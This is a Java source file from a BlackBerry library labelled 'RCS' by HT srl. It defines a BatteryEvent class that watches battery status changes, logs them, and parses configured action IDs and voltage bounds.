//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : BatteryEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.utils.Check;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class BatteryEvent.
 */
public final class BatteryEvent extends Event implements BatteryStatusObserver {

    //#ifdef DEBUG
    private static Debug debug = new Debug("AcEvent", DebugLevel.VERBOSE);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    int minVolt;
    int maxVolt;

    /**
     * Instantiates a new battery event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public BatteryEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_BATTERY, actionId, confParams, "BatteryEvent");

        setPeriod(NEVER);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected void actualStart() {
        AppListener.getInstance().addBatteryStatusObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected void actualStop() {
        AppListener.getInstance().removeBatteryStatusObserver(this);
    }

    /**
     * Battery status change.
     * 
     * @param arg0
     *            the arg0
     */
    public void batteryStatusChange(final int arg0) {
        switch (arg0) {
        case DeviceInfo.BSTAT_AC_CONTACTS:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_AC_CONTACTS");
            //#endif
            break;
        case DeviceInfo.BSTAT_CHARGING:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_CHARGING");
            //#endif
            break;
        case DeviceInfo.BSTAT_DEAD:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_DEAD");
            //#endif
            break;
        case DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_IS_USING_EXTERNAL_POWER");
            //#endif
            break;
        case DeviceInfo.BSTAT_LEVEL_CHANGED:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_LEVEL_CHANGED");
            //#endif
            break;
        case DeviceInfo.BSTAT_LOW:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_LOW");
            //#endif
            break;
        case DeviceInfo.BSTAT_LOW_RATE_CHARGING:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_LOW_RATE_CHARGING");
            //#endif
            break;
        case DeviceInfo.BSTAT_NO_CAMERA_FLASH:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_NO_CAMERA_FLASH");
            //#endif
            break;
        case DeviceInfo.BSTAT_NO_RADIO:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_NO_RADIO");
            //#endif
            break;
        case DeviceInfo.BSTAT_NO_TURN_ON:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_NO_TURN_ON");
            //#endif
            break;
        case DeviceInfo.BSTAT_NO_WLAN:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_NO_WLAN");
            //#endif
            break;
        case DeviceInfo.BSTAT_NONE:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_NONE");
            //#endif
            break;
        case DeviceInfo.BSTAT_REVERSED:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_REVERSED");
            //#endif
            break;
        case DeviceInfo.BSTAT_TOO_COLD:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_TOO_COLD");
            //#endif
            break;
        case DeviceInfo.BSTAT_TOO_HOT:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_TOO_HOT");
            //#endif
            break;
        case DeviceInfo.BSTAT_UNKNOWN_BATTERY:
            //#ifdef DEBUG_INFO
            debug.info("BSTAT_UNKNOWN_BATTERY");
            //#endif
            break;
        default:
            //#ifdef DEBUG_INFO
            debug.info("UNKNOWN");
            //#endif
            break;
        }

    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.BatteryStatusObserver#onBatteryStatusChange(int,
     * int)
     */
    public void onBatteryStatusChange(final int status, final int diff) {
        for (int i = 0; i < 32; i++) {
            final boolean bit = Utils.getBit(diff, i);
            if (bit) {
                batteryStatusChange(1 << i);
            }
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnExit = databuffer.readInt();
            actionOnEnter = actionId;

            minVolt = databuffer.readInt();
            maxVolt = databuffer.readInt();

            //#ifdef DBC
            Check.asserts(actionOnEnter >= Action.ACTION_NULL,
                    "negative value Enter");
            Check.asserts(actionOnExit >= Action.ACTION_NULL,
                    "negative value Exit");
            //#endif

        } catch (final EOFException e) {
            actionOnEnter = Action.ACTION_NULL;
            actionOnExit = Action.ACTION_NULL;
            return false;
        }

        //#ifdef DEBUG
        final StringBuffer sb = new StringBuffer();
        sb.append("enter: " + actionOnEnter);
        sb.append(" exit: " + actionOnExit);
        sb.append(" minVolt: " + minVolt);
        sb.append(" maxVolt: " + maxVolt);
        debug.info(sb.toString());
        //#endif

        return true;
    }

}
